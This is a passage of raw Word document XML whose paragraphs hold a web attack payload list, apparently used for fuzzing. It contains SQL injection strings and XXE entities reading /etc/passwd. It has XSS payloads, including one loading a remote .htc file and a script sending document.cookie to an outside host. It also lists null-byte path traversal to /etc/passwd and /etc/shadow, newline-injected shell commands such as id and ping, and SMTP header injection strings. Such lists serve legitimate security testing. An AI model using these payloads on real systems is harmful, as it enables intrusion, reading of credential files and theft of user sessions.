    </w:p>
    <w:p w14:paraId="6C111338" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>"' or 1 --'"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="661B31C5" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>") or ("a"="a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C513818" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">"&lt;?xml version=""1.0"" encoding=""ISO-8859-1""?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> SYSTEM ""file:////dev/random""&gt;]&gt;&lt;foo&gt;&amp;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>;&lt;/foo&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12E1CF48" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">"&lt;?xml version=""1.0"" encoding=""ISO-8859-1""?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> SYSTEM ""file:////etc/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>passwd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>""&gt;]&gt;&lt;foo&gt;&amp;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>;&lt;/foo&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BD9B978" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>"&lt;?xml version=""1.0"" encoding=""ISO-8859-1""?&gt;&lt;foo&gt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>&lt;![</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>CDATA[' or 1=1 or ''=']]&gt;&lt;/foo&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AAD3943" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>"&lt;?xml version=""1.0"" encoding=""ISO-8859-1""?&gt;&lt;foo&gt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>&lt;![</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>CDATA[&lt;]]&gt;SCRIPT&lt;![CDATA[&gt;]]&gt;alert('XSS');&lt;![CDATA[&lt;]]&gt;/SCRIPT&lt;![CDATA[&gt;]]&gt;&lt;/foo&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="127AA52C" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">"&lt;HTML </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>xmlns:xss</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>&gt;&lt;?import namespace=""</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>xss</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>"" implementation=""http://ha.ckers.org/xss.htc""&gt;&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;&lt;/HTML&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="061F36B2" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>"&lt;xml ID=""</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>xss</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>""&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=""javas&lt;!-- --&gt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>cript:alert</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>('XSS')""&gt;&lt;/B&gt;&lt;/I&gt;&lt;/xml&gt;&lt;SPAN DATASRC=""#</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>xss</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>"" DATAFLD=""B"" DATAFORMATAS=""HTML""&gt;&lt;/SPAN&gt;&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7681F67E" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>"&lt;xml ID=I&gt;&lt;X&gt;&lt;C&gt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>&lt;![</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>CDATA[&lt;IMG SRC=""javas]]&gt;&lt;![CDATA[</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>cript:alert</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>('XSS');""&gt;]]&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72DA49F0" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>"&gt;&lt;script&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B537A4B" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>"&gt;&lt;script&gt;alert(</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>1)&lt;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C875DB3" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>"&gt;&lt;script&gt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>document.location</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>='http://your.site.com/cgi-bin/cookie.cgi?'+document.cookie&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40225652" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>"&gt;xxx&lt;P&gt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>yyy</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="00566DC5" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>"\t"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EBDDA36" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24691393" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>#&amp;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>apos</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E20BAF5" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>#'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78B14322" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>xA</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4369728D" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>xA#xD</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3F5C6729" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>xD</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="56EE64DD" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>xD#xA</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="12A04B61" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>$NULL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A787A97" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>$null</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B03CF17" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C2C9633" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="258AEB49" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%00</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D71114E" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>00..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>/../../../../../etc/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>passwd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="55B1C99B" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>00..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>/../../../../../etc/shadow</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20902B35" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%00/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55D6594F" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%00/etc/passwd%00</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B2D095D" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%01%02%03%04%0a%0d%0aADSF</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29CCEA36" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%08x</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3541E0A6" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%0A/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>usr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>/bin/id</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B5421A3" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%0A/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>usr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>/bin/id%0A</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="259B422F" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%0Aid</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5046C1FE" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%0Aid%0A</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="458CFA99" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%0a ping -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 30 127.0.0.1 %0a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C76AACE" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>oa</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> ping -n 30 127.0.0.1 %0a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F8377E6" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%0a id %0a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="719BB54D" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%0aDATA%0afoo%0a%2e%0aMAIL+</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>FROM:+</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>&lt;youremail&gt;%0aRCPT+TO:+&lt;youremail&gt;%0aDATA%0aFrom:+&lt;youremail&gt;%0aTo:+&lt;youremail&gt;%0aSubject:+tst%0afoo%0a%2e%0a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D8749D3" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%0d</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A28116C" w14:textId="77777777" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="00767C91">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>FROM:+</w:t>
      </w:r>
